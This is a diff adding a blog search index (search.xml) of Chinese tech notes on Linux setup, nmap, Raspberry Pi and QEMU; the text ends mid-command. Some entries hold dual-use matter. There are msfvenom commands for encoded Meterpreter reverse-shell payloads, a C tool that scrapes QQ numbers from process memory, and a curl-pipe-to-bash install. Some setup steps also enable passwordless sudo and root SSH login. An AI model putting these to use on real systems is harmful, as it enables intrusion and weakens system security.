@@ -1,0 +1,163 @@
+<?xml version="1.0" encoding="utf-8"?>
+<search>
+  <entry>
+    <title><![CDATA[manjaro 安装配置]]></title>
+    <url>%2Farticle%2F1224499219.html</url>
+    <content type="text"><![CDATA[manjaro系统更新选择中国最快官方更新源12sudo pacman-mirrors -c Chinasudo pacman -Syyu 安装yaourt123sudo pacman -S base-devel yaourtsudo pacman -Syyusudo pacman -S archlinuxcn-keyring 安装常用软件安装：vim，git，wget1sudo pacman -S vim git wget 默认的vim不要用，我长用的通用配置1bash &lt;(curl -fsSL https://git.io/vFUhE) 添加aur社区源修改pacman配置文件/etc/pacman.conf1sudo vim /etc/pacman.conf 在最后加上下面配置12[archlinuxcn]Server = https://mirrors.ustc.edu.cn/archlinuxcn/$arch 开启aria2c多线程加速下载 安装aria2c 1sudo pacman -S aria2c 修改pacman配置文件/etc/pacman.conf找到Xfercommand修改成如下 1XferCommand = /usr/bin/aria2c -x 8 -s 8 --dir $(dirname %o) -o $(basename %o) %u 保存更新系统 1yaourt -Syyua 安装输入法安装输入sogou输入法1yaourt -S fcitx-im fcitx-configtool fcitx-sogoupinyin 输入环境添加1vim ~/.xprofile 在文件中添加如下配置123export GTK_IM_MODULE=fcitxexport QT_IM_MODULE=fcitxexport XMODIFIERS=&quot;@im=fcitx 安装QQ，微信，网易云音乐1yaourt -S deepin.com.qq.office deepin.com.wechat netease-cloud-music 我安装后 微信 QQ 输入法无法用，修改微信后QQ的启动脚步。微信启动脚本：/opt/deepinwine/apps/Deepin-WeChat/run.shQQ启动脚本：/opt/deepinwine/apps/Deepin-TIM/run.sh在脚本中添加如下配置：123export GTK_IM_MODULE=fcitxexport QT_IM_MODULE=fcitxexport XMODIFIERS=&quot;@im=fcitx&quot;]]></content>
+      <categories>
+        <category>学习</category>
+      </categories>
+      <tags>
+        <tag>学习</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[VM安装Mac系统]]></title>
+    <url>%2Farticle%2F1814314744.html</url>
+    <content type="text"><![CDATA[VM安装MAC系统各类环境测试需求，所以VM成了我电脑常客。最近测试需要苹果系统，可是手上也没有苹果电脑，谁叫我是穷逼啦！VM没办法直接安装Mac系统，国外的大神做了一个VMware Unlock工具解锁VM对Mac系统的支持。 不要问我VM怎么安装 我的系统环境：系统：Windows 10专业版VM版本:VMware Pro 14.1Mac OS:10.13 下载解锁工具 保持最新解锁工具下载上传百度网盘2.1.1版本下载 密码：iapp 解锁工具安装解压后找到win-install文件右键以管理员身份运行 VM安装Mac系统前设置VM设置选项图片比较多，每步我都截图了，如果你VM使用熟练直接跳到最后两张图对CPU设置相关 最后一步是选择你下载的Mac OS系统文件你要下载我安装的版本Mac OS 10.13版本下载(这文件在google云盘上不了google下载不了很正常)网上找的10.13.2网盘 网盘地址 密码:bav4 修改VM配置 找到你设置的位置，在图四的那个位置。找到已.vmx后缀的文件如：我VM命名为macOS 10.13所以文件就是macOS 10.13.vmx右键以记事本本方式打开在最后加入一行smc.version = “0”保存1smc.version = &quot;0&quot; MacOS安装 如图镜像引导成功 格式化磁盘2.1 格式步骤 关闭磁盘工具后选择安装MacOS 选择，安装MacOS后一直下一步，选择安装磁盘继续如果没有磁盘关闭后重复第二步格式磁盘。如图 等待安装完成。]]></content>
+      <categories>
+        <category>学习</category>
+      </categories>
+      <tags>
+        <tag>学习</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[msfvenom命令]]></title>
+    <url>%2Farticle%2F1091155903.html</url>
+    <content type="text"><![CDATA[msfvenom常用指南个人经常使用msfveom命令12msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.0.78 lport=443 -e x86/shikata_ga_nai -f c -i 6 --smallestmsfvenom -p windows/meterpreter/reverse_https lhost=192.168.0.78 lport=443 -e x86/shikata_ga_nai -f c -i 6 --smallest msfvenom 帮助123456789101112131415161718192021-p, --payload &lt;payload&gt; 指定Payload --payload-options 列出 payload选项 -l, --list [type] 列出 payloads, encoders, nops, all -n, --nopsled &lt;length&gt; 添加 payload 下nopsled 大小 -f, --format &lt;format&gt; 指定输出格式 --help-formats 列出支持格式 -e, --encoder &lt;encoder&gt; 指定编码器 -a, --arch &lt;arch&gt; 指定结构(x86,x64) --platform &lt;platform&gt; payload平台 --help-platforms 列出可用平台 -s, --space &lt;length&gt; 设置 payload 大小 --encoder-space &lt;length&gt; 设置payload编码器大小默认-s -b, --bad-chars &lt;list&gt; 设置规避字符。如: &apos;\x00\xff&apos; -i, --iterations &lt;count&gt; 设置 payload编码几次 -c, --add-code &lt;path&gt; 指定 win32 shellcode 文件 -x, --template &lt;path&gt; 指定可执行文件模板 -k, --keep 保留模板功能，payload已注入线程模式运行 -o, --out &lt;path&gt; 保存文件路径 -v, --var-name &lt;name&gt; 指定输出格式的自定义变量名称 --smallest 生成最小 payload -h, --help 帮助 编码器使用比较多的编码器：x86/shikata_ga_nai12345678910111213141516171819202122232425262728293031323334353637383940cmd/echo good Echo Command Encodercmd/generic_sh manual Generic Shell Variable Substitution Command Encodercmd/ifs low Generic $&#123;IFS&#125; Substitution Command Encodercmd/perl normal Perl Command Encodercmd/powershell_base64 excellent Powershell Base64 Command Encodercmd/printf_php_mq manual printf(1) via PHP magic_quotes Utility Command Encodergeneric/eicar manual The EICAR Encodergeneric/none normal The &quot;none&quot; Encodermipsbe/byte_xori normal Byte XORi Encodermipsbe/longxor normal XOR Encodermipsle/byte_xori normal Byte XORi Encodermipsle/longxor normal XOR Encoderphp/base64 great PHP Base64 Encoderppc/longxor normal PPC LongXOR Encoderppc/longxor_tag normal PPC LongXOR Encodersparc/longxor_tag normal SPARC DWORD XOR Encoderx64/xor normal XOR Encoderx64/zutto_dekiru manual Zutto Dekirux86/add_sub manual Add/Sub Encoderx86/alpha_mixed low Alpha2 Alphanumeric Mixedcase Encoderx86/alpha_upper low Alpha2 Alphanumeric Uppercase Encoderx86/avoid_underscore_tolower manual Avoid underscore/tolowerx86/avoid_utf8_tolower manual Avoid UTF8/tolowerx86/bloxor manual BloXor - A Metamorphic Block Based XOR Encoderx86/bmp_polyglot manual BMP Polyglotx86/call4_dword_xor normal Call+4 Dword XOR Encoderx86/context_cpuid manual CPUID-based Context Keyed Payload Encoderx86/context_stat manual stat(2)-based Context Keyed Payload Encoderx86/context_time manual time(2)-based Context Keyed Payload Encoderx86/countdown normal Single-byte XOR Countdown Encoderx86/fnstenv_mov normal Variable-length Fnstenv/mov Dword XOR Encoderx86/jmp_call_additive normal Jump/Call XOR Additive Feedback Encoderx86/nonalpha low Non-Alpha Encoderx86/nonupper low Non-Upper Encoderx86/opt_sub manual Sub Encoder (optimised)x86/service manual Register Servicex86/shikata_ga_nai excellent Polymorphic XOR Additive Feedback Encoderx86/single_static_bit manual Single Static Bitx86/unicode_mixed manual Alpha2 Alphanumeric Unicode Mixedcase Encoderx86/unicode_upper manual Alpha2 Alphanumeric Unicode Uppercase Encoder 输出格式文件模式格式1asp, aspx, aspx-exe, axis2, dll, elf, elf-so, exe, exe-only, exe-service, exe-small, hta-psh, jar, jsp, loop-vbs, macho, msi, msi-nouac, osx-app, psh, psh-cmd, psh-net, psh-reflection, vba, vba-exe, vba-psh, vbs, war 转换格式1bash, c, csharp, dw, dword, hex, java, js_be, js_le, num, perl, pl, powershell, ps1, py, python, raw, rb, ruby, sh, vbapplication, vbscript]]></content>
+      <categories>
+        <category>学习</category>
+      </categories>
+      <tags>
+        <tag>学习</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[进程查找QQ号码]]></title>
+    <url>%2Farticle%2F105276810.html</url>
+    <content type="text"><![CDATA[进程抓取QQ号码前天翻硬盘的时候，不知道什么时候写的一个C语言版本的通过进程抓取内存关键后面的QQ号码原理很简单: 获取系统所有进程，查找QQ进程ID。 通过进程ID获取应用的内存空间。 根据内存关键字查找关键字后面的QQ号码。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123#include "stdafx.h"#include &lt;stdio.h&gt;#include &lt;windows.h&gt;#include &lt;tlhelp32.h&gt;#include &lt;iostream&gt;//#include &lt;iostream.h&gt;void GetQQ(DWORD dwQQID);int main(int argc, char* argv[])&#123; PROCESSENTRY32 pe; DWORD id = 0; DWORD ids[5]; int idleng =0; HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0); pe.dwSize = sizeof(PROCESSENTRY32); if( !Process32First(hSnapshot,&amp;pe) ) return 0; do &#123; pe.dwSize = sizeof(PROCESSENTRY32); if( Process32Next(hSnapshot,&amp;pe)==FALSE ) break; if(strcmp(pe.szExeFile,"QQ.exe") == 0) &#123; ids[idleng] =pe.th32ProcessID; idleng++; //break; &#125; &#125; while(1); CloseHandle(hSnapshot); for (int k=0;k&lt;idleng;k++) &#123; GetQQ(ids[k]); &#125; getchar(); return 0;&#125;void GetQQ(DWORD dwQQID)&#123; HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwQQID); //打开进程 if (hProcess !=NULL) &#123; SuspendThread(hProcess); DWORD dwBaseAddress; MEMORY_BASIC_INFORMATION mbi; char process_mem[ 4096 ] = &#123; 0 &#125; ; DWORD number_of_bytes_read = 0 ; SYSTEM_INFO si; GetSystemInfo( &amp; si); int s =0; char strqqlent[50]; char GetQQKey[] ="\\Msg3.0.db"; dwBaseAddress = (DWORD)si.lpMinimumApplicationAddress; while (dwBaseAddress &lt; (DWORD)si.lpMaximumApplicationAddress) &#123; mbi.BaseAddress = (LPVOID)dwBaseAddress; VirtualQueryEx(hProcess, (LPVOID)dwBaseAddress, &amp; mbi, sizeof (mbi)); dwBaseAddress = (DWORD)mbi.BaseAddress + mbi.RegionSize; if (mbi.State != MEM_COMMIT || mbi.AllocationProtect != PAGE_READWRITE) // 跳过未分配或不可读写的区域 &#123; continue ; &#125; // 搜索 for (DWORD i = (DWORD)mbi.BaseAddress; i &lt; dwBaseAddress; i += 4096 ) &#123; if ( ! ReadProcessMemory(hProcess,LPCVOID(i),process_mem, 4096 , &amp; number_of_bytes_read)) break ; for ( int j = 0 ;j &lt; 4096 - sizeof(GetQQKey) ;j ++ ) &#123; if(s &gt;4) &#123; ResumeThread(hProcess); static char strQQ[50]; for(int m=0;m&lt;s;m++) &#123; strQQ[m] = strqqlent[s-m-1]; &#125; printf("已经发现QQ号:%s\n",strQQ); return; &#125; //去重复内存中的QQ if ( ! memcmp( &amp; process_mem[j], GetQQKey , sizeof(GetQQKey) ) ) &#123; for ( int k = j - 1 ; k &gt; j - 12 ; k -- ) &#123; if (process_mem[k] &gt;= '0' &amp;&amp; process_mem[k] &lt;= '9' ) &#123; process_mem[k]; strqqlent[s] =process_mem[k]; s++; &#125; else&#123; break ; &#125; &#125; &#125; &#125; &#125; &#125; &#125;&#125;]]></content>
+      <categories>
+        <category>学习</category>
+      </categories>
+      <tags>
+        <tag>学习</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[无配置文件log4Net]]></title>
+    <url>%2Farticle%2F4214199755.html</url>
+    <content type="text"><![CDATA[代码配置log4net主要简单的项目不想写配置文件，所以研究了一下不需要配置文件下配置long4net写日志。主要是配置文件写配置直接上代码，也以防我自己忘记记录一下. 12345678910111213141516171819202122232425262728293031323334353637 private Hierarchy _hierarchy = null;private ILoggerRepository _repostitory =null;private PatternLayout _patternLayout = null;private Logger _logger = null; var repostitorys = LogManager.GetAllRepositories(); foreach (var loggrepostitory in repostitorys) &#123; if (!loggrepostitory.Name.Equals(RepositoriesName)) continue; _repostitory = loggrepostitory; break; &#125; if (_repostitory == null) &#123; //1.创建Repositorie2.获取默认 _repostitory = LogManager.CreateRepository(RepositoriesName); //_repostitory = LogManager.GetRepository(Assembly.GetEntryAssembly()); &#125; _hierarchy = (Hierarchy)_repostitory; SetPatternLayout(); RollingFileAppender fileAppender = new RollingFileAppender &#123; Name = LoggerName, Layout = _patternLayout, File = base.FileAppenderFile, AppendToFile = true, MaxSizeRollBackups = 10, MaxFileSize = 100, RollingStyle = RollingFileAppender.RollingMode.Date, DatePattern = &quot;yyyyMMdd&quot; &#125;; fileAppender.AddFilter(SetLevelRangeFilter()); fileAppender.ActivateOptions(); _hierarchy.Root.Level = _hierarchy.LevelMap[&quot;ALL&quot;]; _hierarchy.Root.AddAppender(appender); BasicConfigurator.Configure(_repostitory); 输出格式方法123456789 /// &lt;summary&gt;/// 设置layout输出格式/// &lt;/summary&gt;private void SetPatternLayout()&#123; _patternLayout = new PatternLayout &#123;ConversionPattern = base.ConversionPattern&#125;; _patternLayout.ActivateOptions();&#125; 过滤日志级别123456789101112 /// &lt;summary&gt;/// 设置日志过滤输出级别/// &lt;/summary&gt;/// &lt;returns&gt;&lt;/returns&gt;private LevelRangeFilter SetLevelRangeFilter()&#123; var levelrangefilter = new LevelRangeFilter(); var map = (_hierarchy ==null)? LogManager.GetRepository().LevelMap:_hierarchy.LevelMap; levelrangefilter.LevelMax = map[base.LevelMax]; levelrangefilter.LevelMin = map[base.LevelMin]; return levelrangefilter;&#125; 基本上就这些，如果你还有配置数据库或者其他的参照官网日志配置官网配置示范链接这里放一下我的日志帮助类]]></content>
+      <categories>
+        <category>学习</category>
+      </categories>
+      <tags>
+        <tag>学习</tag>
+        <tag>C#</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[Linux系统监控工具netdata]]></title>
+    <url>%2Farticle%2F4205683256.html</url>
+    <content type="text"><![CDATA[Linux系统监控工具今天推荐一个好看的监控工具netdata,大家可以看看我家的树莓派监控我已经放公网了自己树莓派先上图 下载安装下载地址项目地址123git clone https://github.com/firehol/netdata.gitcd netdatasudo ./netdata-install 配置外网访问nginx这个安装我就不多说了，不会自己查nmp一件安装脚本一堆，不想脚本安装一个命令就安装了 nginx配置1vim /etc/nginx/nginx.conf 我的配置文件 1234567891011121314151617181920212223242526272829303132333435363738#均衡负载upstream brckend &#123; server 127.0.0.1:19999; keepalive 1024;&#125;server &#123;#https配置我删了需要知道怎么开启https自己查或者留言问我#这下面是http配置 listen 80; server_name www.xxx.com; location / &#123; proxy_set_header X-Forwarded-Server $host; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_set_header Connection &quot;keep-alive&quot;; proxy_set_header Host $http_host; proxy_pass http://brckend; proxy_http_version 1.1; proxy_pass_request_headers on; proxy_store off; gzip on; gzip_proxied any; gzip_types *; &#125; #预防攻击 if ($http_user_agent ~* &quot;WordPress&quot;) &#123; return 403; &#125; if ($request_method !~ ^(GET|HEAD|OPTIONS)$ )&#123; return 403; &#125; #禁止爬虫 if ($http_user_agent ~* &quot;Baiduspider|Googlebot|Googlebot-Mobile|Googlebot-Image|Sogou spider|Sogou web spider&quot;) &#123; return 403; &#125; netdata配置12345678vim /etc/netdata/netdata.conf#配置文件中在global下面添加这些[global] bind socket to IP = 127.0.0.1 access log = none disconnect idle web clients after seconds = 3600 enable web responses gzip compression = no 增加打开的文件限制这里系统分是否是systemd类型，想基于Debian系列发布版本的都不是systemd像基于RPM发布版本都是systemd如 不是systemd给这两个文件添加内容 /etc/security/limits.d/nginx.conf 12nginx soft nofile 10000nginx hard nofile 30000 /etc/security/limits.d/netdata.conf 12netdata soft nofile 10000netdata hard nofile 30000 刷新系统1sysctl -p 是systemd系统创建两个文件12mkdir -p /etc/systemd/system/netdata.service.dmkdir -p /etc/systemd/system/nginx.service.d 像这两个文件添加内容12[Service]LimitNOFILE=30000 启动服务123systemctl daemon-reloadsystemctl restart netdata.servicesystemctl restart nginx.service 检查是否有效12cat /proc/$(ps aux | grep &quot;nginx: master process&quot; | grep -v grep | awk &apos;&#123;print $2&#125;&apos;)/limits | grep &quot;Max open files&quot;cat /proc/$(ps aux | grep &quot;netdata&quot; | head -n1 | grep -v grep | awk &apos;&#123;print $2&#125;&apos;)/limits | grep &quot;Max open files&quot; 配置nginx统计插件niginx 配置文件下配置 1234567location /stub_status &#123; stub_status on; access_log off; #allow 127.0.0.1; #deny all; &#125; 如果配置指定域名连接那更改这个文件 /etc/netdata/python.d/nginx.conf url地址改成你的域名如图 配置web日志日志很简单只是没有权限而已1chmod 775 /var/log/nginx/access.log 如果你自定义类日志文件请去下面文件更改 /etc/netdata/python.d/web_log.conf]]></content>
+      <categories>
+        <category>Linux</category>
+      </categories>
+      <tags>
+        <tag>Linux</tag>
+        <tag>工具</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[自定义域名企业邮箱配置]]></title>
+    <url>%2Farticle%2F231249583.html</url>
+    <content type="text"><![CDATA[自定义域名企业邮箱配置 因为，我有自己的域名就想用自己的域名做邮箱。结果国内腾讯，阿里之类的免费企业邮箱自定义域名现在都要备案。我域名没有备案搜索了一圈国外企业邮箱zoho,和YandexMail YandexMail邮箱 YandexMail邮箱支持自定义域名，是俄罗斯最大搜索引擎公司提供的。 优点： 支持1000个自定义用户 每个用户10G空间 支持POP3,IMAP,SMTP协议客服端 缺点： 1.Foxmail发送失败s收件无问题 用来几天感觉没有太大问题，我用win10自带邮件系统。 验证域名 地址：验证地址 如果未注册，会弹出注册,按照步骤严重域名所有权添加MX记录 添加邮件用户 注意DNS配置，如果你不把域名提交给他管理要自己去更改MX,TXT记录 修改DNS记录 注意TXT记录一定要添加不然你的邮件可能被其他邮件公司认为是垃圾邮件 IMAP，POP3，SMTP 地址 协议 地址 SSL 端口 IMAP imap.yandex.com YES 993 POP3 pop.yandex.com YES 995 SMTP smtp.yandex.com YES 465 zoho注册地址优点： 支持25个自定义用户+25推荐后获得的用户 每个用户20G的空间 支持最多20M附件 支持smtp发送信件 缺点： 免费用户不支持IMAP,POP3]]></content>
+      <categories>
+        <category>其他</category>
+      </categories>
+      <tags>
+        <tag>其他</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[nmap 常用命令速查]]></title>
+    <url>%2Farticle%2F7914343816.html</url>
+    <content type="text"><![CDATA[nmap 常用参数主机发现1234567-sL 仅仅是显示,扫描的IP,不会进行任何扫描(域名解析IP之类)-sn ping扫描,即主机发现-Pn 不检测主机存活-PS/PA/PU/PY[portlist] TCP SYN Ping/TCP ACK Ping/UDP Ping发现-PE/PP/PM 使用ICMP echo, timestamp and netmask 请求包发现主机-PO[prococol list] 使用IP协议包探测对方主机是否开启-n/-R 不对IP进行域名反向解析/为所有的IP都进行域名的反响解析 扫描技术12345678-sS/sT/sA/sW/sM TCP SYN/TCP connect()/ACK/TCP窗口扫描/TCP Maimon扫描-sU UDP扫描-sN/sF/sX TCP Null，FIN，and Xmas扫描--scanflags 自定义TCP包中的flags-sI zombie host[:probeport] 高级僵尸扫描([参照](https://nmap.org/book/idlescan.html))-sY/sZ SCTP INIT/COOKIE-ECHO 扫描-sO 使用IP protocol 扫描确定目标机支持的协议类型-b “FTP relay host” 使用FTP bounce scan 指定端口和端口扫描顺序12345-p 特定的端口 -p 80,443 或者 -p 1-65535 全端口扫描 或者 -p T:80 U:8081 扫描TCP 80端口和UDP 8081端口-F 快速扫描模式,比默认的扫描端口还少-r 不随机扫描端口,默认是随机扫描的--top-ports "number" 扫描开放概率最高的number个端口,出现的概率需要参考nmap-services文件,ubuntu中该文件位于/usr/share/nmap.nmap默认扫前1000个--port-ratio "ratio" 扫描指定频率以上的端口 服务和版本探测123456-sV 开放版本探测,可以直接使用-A同时打开操作系统探测和版本探测--version-intensity "level" 设置版本扫描强度,强度水平说明了应该使用哪些探测报文。数值越高，服务越有可能被正确识别。默认是7--version-light 打开轻量级模式,为--version-intensity 2的别名--version-all 尝试所有探测,为--version-intensity 9的别名--version-trace 显示出详细的版本侦测过程信息-sR RPC扫描-sR很少被需要 系统识别123-O 启用操作系统检测,-A来同时启用操作系统检测和版本检测--osscan-limit 针对指定的目标进行操作系统检测(至少需确知该主机分别有一个open和closed的端口)--osscan-guess 推测操作系统检测结果,当Nmap无法确定所检测的操作系统时，会尽可能地提供最相近的匹配，Nmap默认进行这种匹配 时间和性能123456-T 设置时间模板-T0-5 paranoid (0)、sneaky (1)、polite (2)、normal(3)默认模式、 aggressive (4)延时10ms和insane (5)延时5ms--min-hostgroup &lt;milliseconds&gt;; --max-hostgroup &lt;milliseconds&gt; 调整并行扫描组大小 min-hostgroup默认5 --min-parallelism &lt;milliseconds&gt;; --max-parallelism &lt;milliseconds&gt; 调整探测报文的并行度--min-rtt-timeout ， --max-rtt-timeout ， --initial-rtt-timeout 调整探测报文超时已毫秒为单位--host-timeout &lt;milliseconds&gt; 放弃低速目标主机--scan-delay &lt;milliseconds&gt;; --max-scan-delay &lt;milliseconds&gt; 调整探测报文的时间间隔 防火墙/IDS躲避和哄骗123456789101112-f; --mtu value 指定使用分片、指定数据包的MTU.-D decoy1,decoy2,ME 使用诱饵隐蔽扫描-S IP-ADDRESS 源地址欺骗-e interface 使用指定的接口-g/ --source-port PROTNUM 使用指定源端口--proxies url1,[url2],... 使用HTTP或者SOCKS4的代理--data-length NUM 填充随机数据让数据包长度达到NUM--ip-options OPTIONS 使用指定的IP选项来发送数据包--ttl VALUE 设置IP time-to-live域--spoof-mac ADDR/PREFIX/VEBDOR MAC地址伪装--badsum 使用错误的checksum来发送数据包 输出1234567891011121314151617-oN 将标准输出直接写入指定的文件-oX 输出xml文件-oS 将所有的输出都改为大写-oG 输出便于通过bash或者perl处理的格式,非xml-oA BASENAME 可将扫描结果以标准格式、XML格式和Grep格式一次性输出-v 提高输出信息的详细度-d level 设置debug级别,最高是9--reason 显示端口处于带确认状态的原因--open 只输出端口状态为open的端口--packet-trace 显示所有发送或者接收到的数据包--iflist 显示路由信息和接口,便于调试--log-errors 把日志等级为errors/warings的日志输出--append-output 追加到指定的文件--resume FILENAME 恢复已停止的扫描--stylesheet PATH/URL 设置XSL样式表，转换XML输出--webxml 从namp.org得到XML的样式--no-sytlesheet 忽略XML声明的XSL样式表 其他选项12345678-6 开启IPv6-A OS识别,版本探测,脚本扫描和traceroute--datedir DIRNAME 说明用户Nmap数据文件位置--send-eth / --send-ip 使用原以太网帧发送/在原IP层发送--privileged 假定用户具有全部权限--unprovoleged 假定用户不具有全部权限,创建原始套接字需要root权限-V 打印版本信息-h 输出帮助 脚本应为脚本很多没办法说明详细查看翻译的nmap脚本引擎]]></content>
+      <categories>
+        <category>工具</category>
+      </categories>
+      <tags>
+        <tag>Linux</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[树莓派3下arch Linux arm 一些优化]]></title>
+    <url>%2Farticle%2F13694117.html</url>
+    <content type="text"><![CDATA[树莓派安装arch Linux 系统优化没有显示器和键盘的自己找路由器里面的树莓派IP ssh登录默认ssh用户：alarm默认ssh密码：alarm默认root用户密码也是root 0. 修改中科大源修改为中科大的源12nano /etc/pacman.d/mirrorlistServer = http://mirrors.ustc.edu.cn/archlinuxarm/$arch/$repo 1. 更新系统1pacman -Syu 2. 添加普通用户root权限sudo123su #提示输入root密码pacman -S sudonano /etc/sudoers 取消这两行注释，或者在最后添加这两行123%wheel ALL=(ALL) ALL%wheel ALL=(ALL) NOPASSWD: ALL 3. 修改默认用户和root默认密码12sudo passwd alarmsudo passwd root 4. 添加自己好记的普通用户12sudo useradd -d /home/mofeng -m mofengsudo passwd mofeng 5. 开启ssh登录的root权限12nano /etc/ssh/sshd_configPermitRootLogin yes 6. 修改树莓派名称1nano /etc/hostname 7. 安装常用工具wget git curl vim 这几个我经常用到所以先安装了1pacman -S wget git curl vim 8. 安装aru支持（yaourt）工具yaourt 编译的时候的环境可能缺少所以先安装1pacman -S base-devel 编译yaourt相关依赖参照文件 1pacman -S gcc cmake fakeroot pkg-config 安装yajl，有能力的自己编译安装，参照文件有写为什么要这样做我简单化不去多做解释 123456cd /tmp/mkdir yajlcd yajlvim PKGBUILDmakepkg -Acssudo pacman -U yajl-2.1.0-1-armv7h.pkg.tar.xz PKGBUILD文件内容12345678910111213141516171819202122232425# Maintainer: Dave Reisner &lt;d@falconindy.com&gt;# Contributor: Daniel J Griffiths &lt;ghost1227@archlinux.us&gt;# Contributor: Thomas Dziedzic &lt; gostrc at gmail &gt;# Contributor: Andrej Gelenberg &lt;andrej.gelenberg@udo.edu&gt;pkgname=yajlpkgver=2.1.0pkgrel=1pkgdesc=&apos;Yet Another JSON Library&apos;arch=(&apos;i686&apos; &apos;x86_64&apos; &apos;armv7&apos; &apos;armv7h&apos; &apos;armv7l&apos;)url=&apos;http://lloyd.github.com/yajl/&apos;license=(&apos;ISC&apos;)makedepends=(&apos;gcc&apos; &apos;make&apos; &apos;cmake&apos;)source=(&quot;$pkgname-$pkgver.tar.gz::https://github.com/lloyd/$pkgname/archive/$pkgver.tar.gz&quot;)md5sums=(&apos;6887e0ed7479d2549761a4d284d3ecb0&apos;)build() &#123; cd &quot;$pkgname-$pkgver&quot; cmake -DCMAKE_INSTALL_PREFIX=/usr . make&#125;package() &#123; cd &quot;$pkgname-$pkgver&quot; make DESTDIR=&quot;$pkgdir&quot; install install -Dm644 COPYING &quot;$pkgdir/usr/share/licenses/$&#123;pkgname&#125;/LICENSE&quot;&#125; package-query安装 12345cd /tmpgit clone https://aur.archlinux.org/package-query-git.gitcd package-query-gitmakepkg -Acspacman -U package-query-*.xz yaourt 安装1234cd /tmp/git clone https://aur.archlinux.org/yaourt.gitmakepkg -Acssudo pacman -U yaourt*.tar.xz 9. 网络工具包ifconfig,route在net-tools中，nslookup,dig在dnsutils中，ftp,telnet等在inetutils中,ip命令在iproute2中 1pacman -S net-tools dnsutils inetutils iproute2 10. /boot/config.txt优化10.1 音频123456pacman -S alsa-utils# 配置文件中添加dtparam=audio=onhdmi_drive=2 #HDMI输出音频audio_pwm_mode=2 #3.5mm口输出音频 10.2 开启GPIO如果你你们安装yaourt要不你自己手工安装，或者在去aur查找1yaourt -S python-raspberry-gpio 10.3 开启I2C安装i2c-tools和lm_sensors包 1yaourt -S i2c-tools lm_sensors /boot/config.txt中开启i2c的支持 1dtparam=i2c_arm=on 11. 安装补全11.1 shell自动高级补全1sudo pacman -S bash-completion 11.2 git命令补全1sudo pacman -S git-completion 编辑用户环境变量~/.bashrc在最后添加下面一句12#completion[ -f /usr/share/git/completion/git-completion.bash ] &amp;&amp; source /usr/share/git/completion/git-completion.bash 12. 安装中文12.1 中文环境支持修改/etc/locale.gen文件添加编码支持12345678#取消文件的下面两项en_US.UTF-8 UTF-8zh_CN.UTF-8 UTF-8#执行下面命令更新安装sudo locale-gensudo /etc/locale.conf#修改LANGLANG=en_US.UTF-8 12.2 安装字体安装免费字体12sudo pacman -S noto-fonts-cjk cantarell-fonts#重启系统后应该是能显示中文 13. WIFI配置13.1 配置WIFI123456cd /etc/netctlsudo install -m640 examples/wireless-wpa wpasudo vim wpa#修改MyNetwork和WirelessKey（MyNetwork=WIFI名称，WirelessKey=WIFI密码）#启动WIFI配置netctl start wap 使用命令ifconfig查看wlan0接口是否启动 如果你想开机就启动1netctl enable wpa 无桌面参考配置桌面环境参考arch中添加rc.locl启动]]></content>
+      <categories>
+        <category>树莓派</category>
+      </categories>
+      <tags>
+        <tag>rpi</tag>
+        <tag>arch</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[qemu模拟arm架构运行raspberrypi]]></title>
+    <url>%2Farticle%2F2904670243.html</url>
+    <content type="text"><![CDATA[很早以前的树莓派B板，前两天升级内核果断的停止工作了，可是我一直拿他做数据库服务器。我的数据全没有了。所以逼得没办法只能qemu模拟的方式启动树莓派系统。现在终于把数据库备份出来了。数据无价请做好备份！！哎！这次qemu方式加载中一个学习记录记住万一那天我又用上了不用在到处找了 Arch Linux Install QEMU安装QEMU123yaourt -S qemu#因为我们要运行arm架构所以安装qemu-arch-extra 包yaourt -S qemu-arch-extra 环境准备1. raspbian 镜像准备官网下载下载库我下载的是最小树莓派系统：2017-08-16-raspbian-stretch-lite.zip 2. 内核准备2.1. 自己编译内核(QEMU启动失败，不过保留方法以后替换内核懒得查找) os rasbian 使用的内核版本uanem -r查看内部版本号内核下载: raspberrypi linux(git cloen https://github.com/raspberrypi/linux.git) linux-kernel 归档能找到最新稳定版本内核 Linux-kernel-4.4.84 2.1.1 下载内核文件 我SD的OS是raspberrypi所以我使用第一个内核文件12345678#下载4.12.9版本内核wget https://cdn.kernel.org/pub/linux/kernel/v4.x/linux-4.4.84.tar.xzxz -d linux-4.4.84.tar.xz &amp;&amp; tar -xvf linux-4.4.84.tarrm linux-4.4.84.tarcd linux-4.4.84/#raspberrypi内核git cloen https://github.com/raspberrypi/linux.git)cd linux 2.1.2 编译arm内核 编译内核1234567891011121314151617181920#设置编译环境变量export ARCH=armexport CROSS_COMPILE=arm-linux-gnueabihf-####如果你缺少arm-linux-gnueabi-gcc编译工具请安装yaourt -S arm-linux-gnueabihf-gcc####如果你嫌弃安装麻烦git clone https://github.com/raspberrypi/tools.gitexport PATH=$PATH:(你glone下来的路径)arm-bcm2708/gcc-linaro-arm-linux-gnueabihf-raspbian/bin###如我是64位的系统export PATH=/home/mofeng/work/linux-kernel/raspberrypi-tools/arm-bcm2708/gcc-linaro-arm-linux-gnueabihf-raspbian-x64/bin### 检查编译工具链是否完整arm-linux-gnueabihf-gcc -v###我选用默认配置make -j4 defconfig###改变配置make -j4 menuconfig##构建内核make -j4 #我PC的CPU核心是4核所以我-j4来加速编译##复制内核到上一级cp arch/arm/boot/Image ../kernel-rpi.img 2.2 别人编译好的qemu-kernel这个是别人编译好的在github12git clone https://github.com/dhruvvyas90/qemu-rpi-kernel.gitcd qemu-rpi-kernel 文件里面有kernel-qemu-4.4.34-jessie编译好的内核，如果你还是想自己生成tool目录下有./build-kernel-qemu生成脚步 下面我们使用4.4.34版本内核启动 1qemu-system-arm -kernel 